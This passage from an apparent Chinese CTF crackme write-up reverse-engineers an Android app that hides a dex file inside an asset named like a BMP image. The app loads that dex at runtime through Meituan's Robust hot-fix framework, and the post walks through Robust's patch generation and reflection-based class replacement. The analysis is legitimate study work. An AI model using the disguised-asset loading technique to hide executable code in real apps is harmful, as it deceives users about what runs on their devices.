class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> try &#123;</span><br><span class="line">            v10 &#x3D; arg17.getAssets().open(&quot;GeekTan.BMP&quot;);</span><br><span class="line">            v8 &#x3D; new File(arg17.getCacheDir() + File.separator + &quot;GeekTan&quot; + File.separator + &quot;GeekTan.jar&quot;);</span><br><span class="line">            if(!v8.getParentFile().exists()) &#123;</span><br><span class="line">                v8.getParentFile().mkdirs();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        catch(Exception v9) &#123;</span><br><span class="line">            goto label_171;</span><br><span class="line">        &#125;</span><br><span class="line">&#x2F;&#x2F;将v8通过FileOutputStream方法赋值v12</span><br><span class="line">        try &#123;</span><br><span class="line">            v12 &#x3D; new FileOutputStream(v8);</span><br><span class="line">        &#125;</span><br><span class="line">        catch(Throwable v0_3) &#123;</span><br><span class="line">            goto label_17;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        int v0_4 &#x3D; 0x400;</span><br><span class="line">        try &#123;</span><br><span class="line">            byte[] v7 &#x3D; new byte[v0_4];</span><br><span class="line">            while(true) &#123;</span><br><span class="line">            &#x2F;&#x2F;v10给v11赋值  v10是GeekTan.BMP</span><br><span class="line">                int v11 &#x3D; v10.read(v7);</span><br><span class="line">                if(v11 &lt;&#x3D; 0) &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">&#x2F;&#x2F;最终写入到v12中，而v12是new FileOutputStream(v8);</span><br><span class="line">                ((OutputStream)v12).write(v7, 0, v11);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        catch(Throwable v0_3) &#123;</span><br><span class="line">            goto label_88;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>查看对应的BMP文件发现是一个压缩包，里面存在一个dex文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">╰─$ file GeekTan.BMP</span><br><span class="line">GeekTan.BMP: Zip archive data, at least v2.0 to extract</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">╰─$ binwalk GeekTan.BMP</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             Zip archive data, at least v2.0 to extract, name: classes.dex</span><br><span class="line">11635         0x2D73          End of Zip archive, footer length: 22</span><br></pre></td></tr></table></figure><p>同时在fetchPatchList()方法中实例化一个Patch对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Patch v13 &#x3D; new Patch();</span><br></pre></td></tr></table></figure><p>在方法的最后调用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v0_6 &#x3D; &quot;cn.chaitin.geektan.crackme.PatchesInfoImpl&quot;;</span><br><span class="line">v13.setPatchesInfoImplClassFullName(v0_6);</span><br></pre></td></tr></table></figure><p>然后到runRobust()，接下来实例化了PatchExecutor类，可以看到第二个参数就是PatchManipulateImp类的实例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Context v1_1 &#x3D; this.getApplicationContext();</span><br><span class="line">            &#x2F;&#x2F;实例化PatchManipulateImp类</span><br><span class="line">            PatchManipulateImp v2_1 &#x3D; new PatchManipulateImp();</span><br><span class="line">            &#x2F;&#x2F;实例化PatchExecutor类</span><br><span class="line">            PatchExecutor v0_2 &#x3D; new PatchExecutor(v1_1, ((PatchManipulate)v2_1), new GeekTanCallBack());</span><br></pre></td></tr></table></figure><p>这个PatchExecutor类是在<code>com.meituan.robust</code>包下的，是一个第三方包，目前美团官方已经将其开源，在此<strong>暂停</strong>上面的分析，简单学习一下Robust。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105172538245.png" alt="image-20210105172538245"></p><h2 id="Robust热修复框架原理"><a href="#Robust热修复框架原理" class="headerlink" title="Robust热修复框架原理"></a>Robust热修复框架原理</h2><blockquote><p>Robust是美团推出的一款热修复框架，可以在github上面<a href="https://github.com/Meituan-Dianping/Robust">下载</a>它的最新的源码</p><p>Robust的基本原理，主要从下面4个步骤进行学习</p></blockquote><h3 id="1-将APK代码中每个函数都在编译打包阶段自动插入一段代码"><a href="#1-将APK代码中每个函数都在编译打包阶段自动插入一段代码" class="headerlink" title="1.将APK代码中每个函数都在编译打包阶段自动插入一段代码"></a>1.将APK代码中每个函数都在编译打包阶段自动插入一段代码</h3><p>例如，原函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public long getIndex()&#123;</span><br><span class="line">return 100;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>他会被处理成这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;在该类中声明一个接口变量changeQuickRedirect</span><br><span class="line">public static ChangeQuickRedirect changeQuickRedirect;</span><br><span class="line">&#x2F;&#x2F;在要修复的方法中添加以下逻辑代码</span><br><span class="line">    public long getIndex() &#123;</span><br><span class="line">        if(changeQuickRedirect !&#x3D; null) &#123;</span><br><span class="line">            &#x2F;&#x2F;PatchProxy中封装了获取当前className和methodName的逻辑，并在其内部最终调用了changeQuickRedirect的对应函数</span><br><span class="line">            if(PatchProxy.isSupport(new Object[0], this, changeQuickRedirect, false)) &#123;</span><br><span class="line">                return ((Long)PatchProxy.accessDispatch(new Object[0], this, changeQuickRedirect, false)).longValue();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return 100L;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>Robust为每个class增加了个类型为ChangeQuickRedirect的静态成员</li><li>每个方法前都插入了使用changeQuickRedirect相关的逻辑</li><li>当changeQuickRedirect不为null时，会执行到accessDispatch方法从而替换掉之前老的逻辑，达到修复的目的。</li></ul><h3 id="2-生成需要修复的类及方法的类文件并打包成dex"><a href="#2-生成需要修复的类及方法的类文件并打包成dex" class="headerlink" title="2.生成需要修复的类及方法的类文件并打包成dex"></a>2.生成需要修复的类及方法的类文件并打包成dex</h3><p>接下来你可能已经将需要修复的类及方法写好了，这个时候调用Robust的autopatch文件夹中的类及方法会生成如下主要文件：PatchesInfoImpl.java，xxxPatchControl.java（其中xxx为原类的名字）。</p><p>PatchesInfoImpl.java的内是由PatchesInfoFactory类的createPatchesInfoClass生成的，这是它生成PatchesInfoImpl逻辑，可以看到，这个类其实是用拼接得到的。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105175948713.png" alt="image-20210105175948713"></p><p>具体代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">private CtClass creatxePatchesInfoClass() &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">    &#x2F;&#x2F;创建PatchesInfoImpl类</span><br><span class="line">        CtClass ctPatchesInfoImpl &#x3D; classPool.makeClass(Config.patchPackageName + &quot;.PatchesInfoImpl&quot;);</span><br><span class="line">        ctPatchesInfoImpl.getClassFile().setMajorVersion(ClassFile.JAVA_7);</span><br><span class="line">        ctPatchesInfoImpl.setInterfaces(new CtClass[]&#123;classPool.get(&quot;com.meituan.robust.PatchesInfo&quot;)&#125;);</span><br><span class="line">        StringBuilder methodBody &#x3D; new StringBuilder();</span><br><span class="line">        &#x2F;&#x2F;拼接类中的内容</span><br><span class="line">        methodBody.append(&quot;public java.util.List getPatchedClassesInfo() &#123;&quot;);</span><br><span class="line">        methodBody.append(&quot;  java.util.List patchedClassesInfos &#x3D; new java.util.ArrayList();&quot;);</span><br><span class="line">        for (int i &#x3D; 0; i &lt; Config.modifiedClassNameList.size(); i++) &#123;</span><br><span class="line">            if (Constants.OBSCURE) &#123;</span><br><span class="line">                methodBody.append(&quot;com.meituan.robust.PatchedClassInfo patchedClass&quot; + i + &quot; &#x3D; new com.meituan.robust.PatchedClassInfo(\&quot;&quot; + ReadMapping.getInstance().getClassMappingOrDefault(Config.modifiedClassNameList.get(i)).getValueName() + &quot;\&quot;,\&quot;&quot; + NameManger.getInstance().getPatchControlName(Config.modifiedClassNameList.get(i).substring(Config.modifiedClassNameList.get(i).lastIndexOf(&#39;.&#39;) + 1)) + &quot;\&quot;);&quot;);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                methodBody.append(&quot;com.meituan.robust.PatchedClassInfo patchedClass&quot; + i + &quot; &#x3D; new com.meituan.robust.PatchedClassInfo(\&quot;&quot; + Config.modifiedClassNameList.get(i) + &quot;\&quot;,\&quot;&quot; + NameManger.getInstance().getPatchControlName(Config.modifiedClassNameList.get(i).substring(Config.modifiedClassNameList.get(i).lastIndexOf(&#39;.&#39;) + 1)) + &quot;\&quot;);&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            methodBody.append(&quot;patchedClassesInfos.add(patchedClass&quot; + i + &quot;);&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        methodBody.append(Constants.ROBUST_UTILS_FULL_NAME + &quot;.isThrowable&#x3D;!&quot; + Config.catchReflectException + &quot;;&quot;);</span><br><span class="line">        methodBody.append(&quot;return patchedClassesInfos;\n&quot; +</span><br><span class="line">                &quot;    &#125;&quot;);</span><br><span class="line">        CtMethod m &#x3D; make(methodBody.toString(), ctPatchesInfoImpl);</span><br><span class="line">        ctPatchesInfoImpl.addMethod(m);</span><br><span class="line">        return ctPatchesInfoImpl;</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        throw new RuntimeException(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成的PatchesInfoImpl类型及类内容如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public class PatchesInfoImpl implements PatchesInfo &#123;</span><br><span class="line">    public List getPatchedClassesInfo() &#123;</span><br><span class="line">        List arrayList &#x3D; new ArrayList();</span><br><span class="line">        &#x2F;&#x2F;PatchedClassInfo(&quot;原来的类&quot;,&quot;修复后的类control&quot;);</span><br><span class="line">        arrayList.add(new PatchedClassInfo(&quot;cn.chaitin.geektan.crackme.MainActivity&quot;, &quot;cn.chaitin.geektan.crackme.MainActivityPatchControl&quot;));</span><br><span class="line">        arrayList.add(new PatchedClassInfo(&quot;cn.chaitin.geektan.crackme.MainActivity$1&quot;, &quot;cn.chaitin.geektan.crackme.MainActivity$1PatchControl&quot;));</span><br><span class="line">        EnhancedRobustUtils.isThrowable &#x3D; false;</span><br><span class="line">        return arrayList;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外还会生成一个xxxPatchControl类，通过<code>PatchesControlFactory</code>的<code>createControlClass()</code>方法生成，具体的逻辑和生成PatchesInfoImpl类类似,其中每个Control类中都存在以下静态成员变量和方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">private CtClass createControlClass(CtClass modifiedClass) throws Exception &#123;</span><br><span class="line">        CtClass patchClass &#x3D; classPool.get(NameManger.getInstance().getPatchName(modifiedClass.getName()));</span><br><span class="line">        patchClass.defrost();</span><br><span class="line">        CtClass controlClass &#x3D; classPool.getAndRename(Constants.PATCH_TEMPLATE_FULL_NAME, NameManger.getInstance().getPatchControlName(modifiedClass.getSimpleName()));</span><br><span class="line">        StringBuilder getRealParameterMethodBody &#x3D; new StringBuilder();</span><br><span class="line">        getRealParameterMethodBody.append(&quot;public Object getRealParameter(Object parameter) &#123;&quot;);</span><br><span class="line">        getRealParameterMethodBody.append(&quot;if(parameter instanceof &quot; + modifiedClass.getName() + &quot;)&#123;&quot;);</span><br><span class="line">        getRealParameterMethodBody.</span><br><span class="line">                append(&quot;return new &quot; + patchClass.getName() + &quot;(parameter);&quot;);</span><br><span class="line">        getRealParameterMethodBody.append(&quot;&#125;&quot;);</span><br><span class="line">        getRealParameterMethodBody.append(&quot;return parameter;&#125;&quot;);</span><br><span class="line">        controlClass.addMethod(CtMethod.make(getRealParameterMethodBody.toString(), controlClass));</span><br><span class="line">        controlClass.getDeclaredMethod(&quot;accessDispatch&quot;).insertBefore(getAccessDispatchMethodBody(patchClass, modifiedClass.getName()));</span><br><span class="line">        controlClass.getDeclaredMethod(&quot;isSupport&quot;).insertBefore(getIsSupportMethodBody(patchClass, modifiedClass.getName()));</span><br><span class="line">        controlClass.defrost();</span><br><span class="line">        return controlClass;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>将含有PatchesInfoImpl.java和xxxPatchControl.java,以及xxxPatch.java（具体修复的类）打包成dex文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public class xxxPatchControl implements ChangeQuickRedirect</span><br><span class="line">&#123;</span><br><span class="line"> </span><br><span class="line">public static final String MATCH_ALL_PARAMETER &#x3D; &quot;(\\w*\\.)*\\w*&quot;;</span><br><span class="line"> </span><br><span class="line">private static final Map&lt;Object, Object&gt; keyToValueRelation &#x3D; new WeakHashMap();</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;获取函数的参数的方法</span><br><span class="line">public Object getRealParameter(Object obj)&#123;..具体逻辑..&#125;</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;判断是否支持修复</span><br><span class="line">public boolean isSupport(String methodName, Object[] paramArrayOfObject)</span><br><span class="line">&#123;..具体逻辑.&#125;</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;执行到accessDispatch方法替换旧的类方法</span><br><span class="line">public Object accessDispatch(String methodName, Object[] paramArrayOfObject) &#123;.具体逻辑..&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;解决boolean被优化成byte的问题</span><br><span class="line">private static Object fixObj(Object booleanObj) &#123;.具体逻辑..&#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-加载动态dex文件，以反射的方式修改替换旧类"><a href="#3-加载动态dex文件，以反射的方式修改替换旧类" class="headerlink" title="3.加载动态dex文件，以反射的方式修改替换旧类"></a>3.加载动态dex文件，以反射的方式修改替换旧类</h3><p>回到我们刚刚分析的地方，跟进PatchExecutor类看看。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public void run() &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        &#x2F;&#x2F;拉取补丁列表</span><br><span class="line">        List&lt;Patch&gt; patches &#x3D; fetchPatchList();</span><br><span class="line">        &#x2F;&#x2F;应用补丁列表</span><br><span class="line">        applyPatchList(patches);</span><br><span class="line">    &#125; catch (Throwable t) &#123;</span><br><span class="line">        Log.e(&quot;robust&quot;, &quot;PatchExecutor run&quot;, t);</span><br><span class="line">        robustCallBack.exceptionNotify(t, &quot;class:PatchExecutor,method:run,line:36&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在run方法中，主要做了2件事。</p><h4 id="1-获取补丁列表"><a href="#1-获取补丁列表" class="headerlink" title="1.获取补丁列表"></a>1.获取补丁列表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ist&lt;Patch&gt; patches &#x3D; fetchPatchList();</span><br><span class="line">&#x2F;&#x2F;PatchManipulateImp类的fetchPatchList方法</span><br><span class="line">protected List&lt;Patch&gt; fetchPatchList() &#123;</span><br><span class="line">        return patchManipulate.fetchPatchList(context);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="2-应用补丁"><a href="#2-应用补丁" class="headerlink" title="2.应用补丁"></a>2.应用补丁</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">applyPatchList(patches);</span><br><span class="line"> </span><br><span class="line">protected void applyPatchList(List&lt;Patch&gt; patches) &#123;</span><br><span class="line">       if (null &#x3D;&#x3D; patches || patches.isEmpty()) &#123;</span><br><span class="line">           return;</span><br><span class="line">       &#125;</span><br><span class="line">       Log.d(&quot;robust&quot;, &quot; patchManipulate list size is &quot; + patches.size());</span><br><span class="line">       for (Patch p : patches) &#123;</span><br><span class="line">           if (p.isAppliedSuccess()) &#123;</span><br><span class="line">               Log.d(&quot;robust&quot;, &quot;p.isAppliedSuccess() skip &quot; + p.getLocalPath());</span><br><span class="line">               continue;</span><br><span class="line">           &#125;</span><br><span class="line">           if (patchManipulate.ensurePatchExist(p)) &#123;</span><br><span class="line">               boolean currentPatchResult &#x3D; false;</span><br><span class="line">               try &#123;</span><br><span class="line">               &#x2F;&#x2F;真正应用补丁的方法patch()</span><br><span class="line">                   currentPatchResult &#x3D; patch(context, p);</span><br><span class="line">               &#125; catch (Throwable t) &#123;</span><br><span class="line">                   robustCallBack.exceptionNotify(t, &quot;class:PatchExecutor method:applyPatchList line:69&quot;);</span><br><span class="line">               &#125;</span><br><span class="line">               if (currentPatchResult) &#123;</span><br><span class="line">                   &#x2F;&#x2F;设置patch 状态为成功</span><br><span class="line">                   p.setAppliedSuccess(true);</span><br><span class="line">                   &#x2F;&#x2F;统计PATCH成功率 PATCH成功</span><br><span class="line">                   robustCallBack.onPatchApplied(true, p);</span><br><span class="line"> </span><br><span class="line">               &#125; else &#123;</span><br><span class="line">                   &#x2F;&#x2F;统计PATCH成功率 PATCH失败</span><br><span class="line">                   robustCallBack.onPatchApplied(false, p);</span><br><span class="line">               &#125;</span><br><span class="line"> </span><br><span class="line">               Log.d(&quot;robust&quot;, &quot;patch LocalPath:&quot; + p.getLocalPath() + &quot;,apply result &quot; + currentPatchResult);</span><br><span class="line"> </span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>跟进patch()进行分析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">protected boolean patch(Context context, Patch patch) &#123;</span><br><span class="line">    &#x2F;&#x2F;验证patch的hash</span><br><span class="line">        if (!patchManipulate.verifyPatch(context, patch)) &#123;</span><br><span class="line">            robustCallBack.logNotify(&quot;verifyPatch failure, patch info:&quot; + &quot;id &#x3D; &quot; + patch.getName() + &quot;,md5 &#x3D; &quot; + patch.getMd5(), &quot;class:PatchExecutor method:patch line:107&quot;);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#x2F;&#x2F;调用DexClassLoader动态加载dex</span><br><span class="line">        DexClassLoader classLoader &#x3D; new DexClassLoader(patch.getTempPath(), context.getCacheDir().getAbsolutePath(),</span><br><span class="line">                null, PatchExecutor.class.getClassLoader());</span><br><span class="line">        patch.delete(patch.getTempPath());</span><br><span class="line"> </span><br><span class="line">        Class patchClass, oldClass;</span><br><span class="line"> </span><br><span class="line">        Class patchsInfoClass;</span><br><span class="line">        PatchesInfo patchesInfo &#x3D; null;</span><br><span class="line">        try &#123;</span><br><span class="line">        &#x2F;&#x2F;动态加载PatchesInfoImpl，获取要patch的类</span><br><span class="line">            patchsInfoClass &#x3D; classLoader.loadClass(patch.getPatchesInfoImplClassFullName());</span><br><span class="line">            patchesInfo &#x3D; (PatchesInfo) patchsInfoClass.newInstance();</span><br><span class="line">            Log.d(&quot;robust&quot;, &quot;PatchsInfoImpl ok&quot;);</span><br><span class="line">        &#125; catch (Throwable t) &#123;</span><br><span class="line">            robustCallBack.exceptionNotify(t, &quot;class:PatchExecutor method:patch line:108&quot;);</span><br><span class="line">            Log.e(&quot;robust&quot;, &quot;PatchsInfoImpl failed,cause of&quot; + t.toString());</span><br><span class="line">            t.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        if (patchesInfo &#x3D;&#x3D; null) &#123;</span><br><span class="line">            robustCallBack.logNotify(&quot;patchesInfo is null, patch info:&quot; + &quot;id &#x3D; &quot; + patch.getName() + &quot;,md5 &#x3D; &quot; + patch.getMd5(), &quot;class:PatchExecutor method:patch line:114&quot;);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        &#x2F;&#x2F;classes need to patch</span><br><span class="line"> </span><br><span class="line">        &#x2F;&#x2F;获取要打补丁的类patchedClasses </span><br><span class="line">        List&lt;PatchedClassInfo&gt; patchedClasses &#x3D; patchesInfo.getPatchedClassesInfo();</span><br><span class="line">        if (null &#x3D;&#x3D; patchedClasses || patchedClasses.isEmpty()) &#123;</span><br><span class="line">            robustCallBack.logNotify(&quot;patchedClasses is null or empty, patch info:&quot; + &quot;id &#x3D; &quot; + patch.getName() + &quot;,md5 &#x3D; &quot; + patch.getMd5(), &quot;class:PatchExecutor method:patch line:122&quot;);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">          &#x2F;&#x2F;循环类名，将patchedClasses中的类打补丁</span><br><span class="line">        for (PatchedClassInfo patchedClassInfo : patchedClasses) &#123;</span><br><span class="line">            String patchedClassName &#x3D; patchedClassInfo.patchedClassName;</span><br><span class="line">            String patchClassName &#x3D; patchedClassInfo.patchClassName;</span><br><span class="line">            if (TextUtils.isEmpty(patchedClassName) || TextUtils.isEmpty(patchClassName)) &#123;</span><br><span class="line">                robustCallBack.logNotify(&quot;patchedClasses or patchClassName is empty, patch info:&quot; + &quot;id &#x3D; &quot; + patch.getName() + &quot;,md5 &#x3D; &quot; + patch.getMd5(), &quot;class:PatchExecutor method:patch line:131&quot;);</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line">            Log.d(&quot;robust&quot;, &quot;current path:&quot; + patchedClassName);</span><br><span class="line">            try &#123;</span><br><span class="line">            &#x2F;&#x2F;将oldClass的changeQuickRedirectField的值设置为null</span><br><span class="line">                oldClass &#x3D; classLoader.loadClass(patchedClassName.trim());</span><br><span class="line">                Field[] fields &#x3D; oldClass.getDeclaredFields();</span><br><span class="line">                Log.d(&quot;robust&quot;, &quot;oldClass :&quot; + oldClass + &quot;     fields &quot; + fields.length);</span><br><span class="line">                Field changeQuickRedirectField &#x3D; null;</span><br><span class="line">                for (Field field : fields) &#123;</span><br><span class="line">                    if (TextUtils.equals(field.getType().getCanonicalName(), ChangeQuickRedirect.class.getCanonicalName()) &amp;&amp; TextUtils.equals(field.getDeclaringClass().getCanonicalName(), oldClass.getCanonicalName())) &#123;</span><br><span class="line">                        changeQuickRedirectField &#x3D; field;</span><br><span class="line">                        break;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                if (changeQuickRedirectField &#x3D;&#x3D; null) &#123;</span><br><span class="line">                    robustCallBack.logNotify(&quot;changeQuickRedirectField  is null, patch info:&quot; + &quot;id &#x3D; &quot; + patch.getName() + &quot;,md5 &#x3D; &quot; + patch.getMd5(), &quot;class:PatchExecutor method:patch line:147&quot;);</span><br><span class="line">                    Log.d(&quot;robust&quot;, &quot;current path:&quot; + patchedClassName + &quot; something wrong !! can  not find:ChangeQuickRedirect in&quot; + patchClassName);</span><br><span class="line">                    continue;</span><br><span class="line">                &#125;</span><br><span class="line">                Log.d(&quot;robust&quot;, &quot;current path:&quot; + patchedClassName + &quot; find:ChangeQuickRedirect &quot; + patchClassName);</span><br><span class="line">                try &#123;</span><br><span class="line">             &#x2F;&#x2F;动态加载补丁类</span><br><span class="line">                    patchClass &#x3D; classLoader.loadClass(patchClassName);</span><br><span class="line">                    Object patchObject &#x3D; patchClass.newInstance();</span><br><span class="line">                    changeQuickRedirectField.setAccessible(true);</span><br><span class="line">             &#x2F;&#x2F;将它的changeQuickRedirectField设置为patchObject实例。</span><br><span 